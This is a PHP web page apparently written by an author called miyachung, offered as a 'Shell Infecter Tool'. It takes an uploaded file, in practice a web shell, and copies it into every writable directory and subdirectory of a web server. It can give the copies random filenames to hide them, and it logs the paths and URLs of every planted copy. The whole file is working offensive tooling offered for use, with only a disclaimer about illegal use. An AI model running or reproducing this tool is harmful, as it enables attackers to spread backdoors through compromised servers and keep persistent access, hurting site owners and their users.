<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Shell Infecter Tool - by: miyachung</title>
    <script></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500&display=swap');
        
        * {
            list-style:none;
            text-decoration:none;
            margin:0;
            padding:0;
            box-sizing:border-box;
        }
        body{
            font-family: 'Poppins', sans-serif;
            background: lightblue;
            font-weight:500;
        }
        .holder{
            display:flex;
            flex-direction:column;
            align-items:center;
        }
        .holder .result{
            width:100%;
            height:350px;
            overflow:auto;
            display:flex;
            flex-direction:column;
            align-items:center;
        }
        .spider{
            margin-top:-30px;
            color:black;
            text-align:center;
            transform:scale(0.90);
        }
        form{
            width:80%;
            margin-top:-40px;
            display:flex;
            flex-direction:column;
            
        }
        a:hover{
            color:black;
        }
        a:visited{
            color:blue;
        } 
        a:visited:hover{
            color:black;
        }
        form span{
            display:block;
        }
        form input[type=text]{
            transition: 300ms width;
            font-family: 'Poppins', sans-serif;
            width:30%;
            height:35px;
            padding:10px;
            outline:none;
            border:none;
            color:gray;
        }
    
        form input[type=text]:focus{
            width:100%;
            border:1px solid #34aeeb;
            color:black;
        }
        form input[type=checkbox]{
            width:20px;
            height:20px;
        }
        form button{
            padding:10px;
            border:none;
            cursor:pointer;
            width:200px;
            height:45px;
            background:black;   
            color:white;
        }

        form button i{
            margin-right:10px;
        }
    </style>
</head>
<body>

<div class="holder">


    <pre class="spider">
        .__                      .__                                  .__           .__  .__    .__        _____              __                
  _____ |__|___.__._____    ____ |  |__  __ __  ____    ____     _____|  |__   ____ |  | |  |   |__| _____/ ____\____   _____/  |_  ___________ 
 /     \|  <   |  |\__  \ _/ ___\|  |  \|  |  \/    \  / ___\   /  ___/  |  \_/ __ \|  | |  |   |  |/    \   __\/ __ \_/ ___\   __\/  _ \_  __ \
|  Y Y  \  |\___  | / __ \\  \___|   Y  \  |  /   |  \/ /_/  >  \___ \|   Y  \  ___/|  |_|  |__ |  |   |  \  | \  ___/\  \___|  | (  <_> )  | \/
|__|_|  /__|/ ____|(____  /\___  >___|  /____/|___|  /\___  /  /____  >___|  /\___  >____/____/ |__|___|  /__|  \___  >\___  >__|  \____/|__|   
      \/    \/          \/     \/     \/           \//_____/        \/     \/     \/                    \/          \/     \/                   

      
                                            
           ;               ,           
         ,;                 '.         
        ;:                   :;        
       ::                     ::       
       ::                     ::       
       ':                     :        
        :.                    :        
     ;' ::                   ::  '     
    .'  ';                   ;'  '.    
   ::    :;                 ;:    ::   
   ;      :;.             ,;:     ::   
   :;      :;:           ,;"      ::   
   ::.      ':;  ..,.;  ;:'     ,.;:   
    "'"...   '::,::::: ;:   .;.;""'    
        '"""....;:::::;,;.;"""         
    .:::.....'"':::::::'",...;::::;.   
   ;:' '""'"";.,;:::::;.'""""""  ':;   
  ::'         ;::;:::;::..         :;  
 ::         ,;:::::::::::;:..       :: 
 ;'     ,;;:;::::::::::::::;";..    ':.
::     ;:"  ::::::"""'::::::  ":     ::
 :.    ::   ::::::;  :::::::   :     ; 
  ;    ::   :::::::  :::::::   :    ;  
   '   ::   ::::::....:::::'  ,:   '   
    '  ::    :::::::::::::"   ::       
       ::     ':::::::::"'    ::       
       ':       """""""'      ::       
        ::                   ;:        
        ':;                 ;:"        
           ';              ,;'          
            "'           '"            
    </pre>


<?php
/*
        .__                      .__                          
  _____ |__|___.__._____    ____ |  |__  __ __  ____    ____  
 /     \|  <   |  |\__  \ _/ ___\|  |  \|  |  \/    \  / ___\ 
|  Y Y  \  |\___  | / __ \\  \___|   Y  \  |  /   |  \/ /_/  >
|__|_|  /__|/ ____|(____  /\___  >___|  /____/|___|  /\___  / 
      \/    \/          \/     \/     \/           \//_____/  

      @ Title : Shell Infecter Tool
      @ Author: miyachung
      @ Description: A tool which can infect your code (file) to all dirs and subdirs on a web-server
      @ Date: 08.09.2021

      !! Note !!

      - Author doesn't take any responsibilities on illegally usagement
*/
@set_time_limit(0);
@ini_set('max_execution_time',0);
@ini_set('safe_mode','Off');
error_reporting(E_ALL ^ E_NOTICE ^ E_WARNING);


if($_POST):
   
    print '<div class="result">';
    $filename           = $_FILES['file_to_infect']['name'];
    $infection_file     = $_FILES['file_to_infect']['tmp_name'];
    $infection_url      = $_POST['infect_url'];
    $infect_path        = $_POST['infect_destination'];
    $infect_all_dirs    = isset($_POST['infect_all_dirs']) ? true : false;
    $infect_with_random    = isset($_POST['infect_with_random']) ? true : false;

    if(empty($infection_file)){
        print '<font color="red">Please select a file to infect!</font>';
    }else{
        if(empty($infect_path) || !is_dir($infect_path)){
            print '<font color="red">Please give a valid destination path to start infecting..!</font>';
        }else{        

            // Start infecting..
            zombie();
            
        }
    }
    print '</div>';


   ?>
<?php else: ?>

<form action="" method="post" enctype="multipart/form-data" onsubmit="event.preventDefault(); var a=window.confirm('Are you sure ? '); if(a){this.submit();}else{return false;} ">
<span><label for="file_to_infect" style="cursor:pointer;"><i class="fas fa-upload size fa-2x" style="width:50px;"></i><label style='text-decoration:underline;cursor:pointer' for="file_to_infect">Choose your file</label></label>
<input type="file" id="file_to_infect" name="file_to_infect" style="display:none"/></span>
<span><label for="infect_destination">Give a destination path to start infecting from</label><br/>
<input type="text" id="infect_destination" name="infect_destination" required value="<?=getcwd();?>" placeholder="<?=getcwd();?>" /></span>
<span><label for="infect_url">URL Path ( for accessing infected file )</label><br/>
<input type="text" id="infect_url" name="infect_url" required value="<?=getURL($_SERVER['REQUEST_SCHEME'].'://'.$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI']);?>" placeholder="<?=getURL($_SERVER['REQUEST_SCHEME'].'://'.$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI']);?>" /></span>
<br/><span>
<input type="checkbox" name="infect_all_dirs" id="infect_all_dirs" />
<label for="infect_all_dirs">Infect to sub-directories</label></span>
<span><input type="checkbox" name="infect_with_random" id="infect_with_random" />
<label for="infect_with_random">Infect with random filenames</label></span>
<br/>
<button type="submit"><i class="fas fa-spider"></i>Start Infection</button>

</form>
<?php 
endif;


function zombie(){
    
    global $infect_all_dirs,$infect_with_random,$infect_path,$infection_file,$filename;
    print '<span>Changing directory to <font color="red">'.$infect_path.'</font>...</span>';
    if(chdir($infect_path)){

        
        echo '<span><font color="green">OK</font></span>';
        ob_end_flush();
        ob_flush();
        flush(); 
        echo '<span><a href="infected_logs.txt" target="_blank">Show log file</a></span>';
        ob_end_flush();
        ob_flush();
        flush(); 
        echo '<span>-----------------------------------------------------------------------------------------------------------------------</span>';
        $current_dir       = array_diff(scandir($infect_path,1), array('..', '.'));
        $current_dir       = array_values($current_dir);
        $infected_paths    = array();
        $self_file         = basename(__FILE__);
        $extension         = pathinfo($filename);
        $extension         = $extension['extension'];
        $range_letters1 = range('a','z');
        $range_letters2 = range('A','Z');
        $range_letters3 = range(0,9);
        $range_letters  = array_merge($range_letters1,$range_letters2,$range_letters3);
        shuffle($range_letters);

        foreach($current_dir as $what){

            if(is_dir($what)){
                if(is_writable($what)){
                    if(!$infect_all_dirs){

                        infecter($range_letters,$extension,$what);

                    }else{


                        if($infect_all_dirs){
                            infecter($range_letters,$extension,$what);

                            if(chdir($what)){
                                
                                $search_dir = dir_search();

                                while(!empty($search_dir)){
                                    
                                    foreach($search_dir as $dir){
                                        
                                        if(is_writable($dir)){
                                            infecter($range_letters,$extension,$dir);
                                        }
                                        
                                    }
                                    
                                        foreach($search_dir as $d){
                                            if(is_writable($d)) infecter($range_letters,$extension,$d);

                                            if(chdir($d)){
                                                $search_dir = dir_search();
                                            }
                                        }
                                }
                                chdir($infect_path);
                                
                            }
                            
                            
                        }

                    }
                }
                
            }
        }
        global $infected_paths;
        file_put_contents(__DIR__.'/infected_logs.txt',"[MIYACHUNG SHELL INFECTOR - INFECTED PATHS]".PHP_EOL.PHP_EOL);
        file_put_contents(__DIR__.'/infected_logs.txt',implode(PHP_EOL,$infected_paths['file_path']),FILE_APPEND|LOCK_EX);
        file_put_contents(__DIR__.'/infected_logs.txt',PHP_EOL.PHP_EOL."[MIYACHUNG SHELL INFECTOR - INFECTED URL PATHS]".PHP_EOL.PHP_EOL,FILE_APPEND|LOCK_EX);
        file_put_contents(__DIR__.'/infected_logs.txt',implode(PHP_EOL,$infected_paths['url_path']),FILE_APPEND|LOCK_EX);


    }else{
        print '<span><font color="red">Can not change dir to '.$infect_path.'</font></span>';
        return false;
    }
   
   
}
function random_dir($range_letters){
    $dir_random = '';
    for($i=0;$i < 20; $i++){
        $rand_arr = array_rand($range_letters,3);
        $letters = '';
        foreach($rand_arr as $r){
            $letters .= $range_letters[$r];
        }
        $dir_random .= $letters.'/';
    }

    $dir_random = rtrim($dir_random,'/');
    return $dir_random;
}
function dir_search(){
    $current       = array_diff(scandir('.',1), array('..', '.'));
    $current       = array_values($current);

    $dirs = array();
    foreach($current as $d){
        if(is_dir($d)){
            $dirs[] = $d;
        }
    }

    return $dirs;
}
 function getURL($site)
{$parsed = parse_url($site);$path  = $parsed['path'];$path  = explode("/",$path);$path    = array_filter($path);$path    = array_values($path);$count  = count($path)-1;
unset($path[$count]);
 $url  = "http://".$parsed['host'];
for($i=0;$i<count($path);$i++)
{$url .= "/$path[$i]";
}
return $url;
}
function infecter($range_letters,$extension,$what){
    global $infect_with_random,$filename,$infect_path,$infection_file,$infection_url,$infected_paths;

    if($infect_with_random){
                            

        $rand_arr = array_rand($range_letters,8);
    
        $letters = '';
        
        foreach($rand_arr as $r){
            $letters .= $range_letters[$r];
        }

        $rand_file_name = $letters.'.'.$extension;

        if(@copy($infection_file,$what.'/'.$rand_file_name)){
            print '<span><font color="green">Infected</font> '.getcwd().'/'.$what.'/'.$rand_file_name.'</span>';
            ob_end_flush();
            ob_flush();
            flush();
            $infected_paths['url_path'][] = str_replace($infect_path,$infection_url,getcwd().'/'.$what.'/'.$rand_file_name);
            $infected_paths['file_path'][] = getcwd().'/'.$what.'/'.$rand_file_name;
        }else{
            print '<span><font color="red">Failed</font> '.getcwd().'/'.$what.'/'.$rand_file_name.'</span>';
            ob_end_flush();
            ob_flush();
            flush();
        }


    }else{

        if(@copy($infection_file,$what.'/'.$filename)){
            print '<span><font color="green">Infected</font> '.getcwd().'/'.$what.'/'.$filename.'</span>';
            ob_end_flush();
            ob_flush();
            flush();
            $infected_paths['url_path'][] = str_replace($infect_path,$infection_url,getcwd().'/'.$what.'/'.$filename);
            $infected_paths['file_path'][] = getcwd().'/'.$what.'/'.$filename;
        }else{
            print '<span><font color="red">Failed</font> '.getcwd().'/'.$what.'/'.$filename.'</span>';
            ob_end_flush();
            ob_flush();
            flush();
        }
        
    }
}


?>

</div>

</body>
</html>
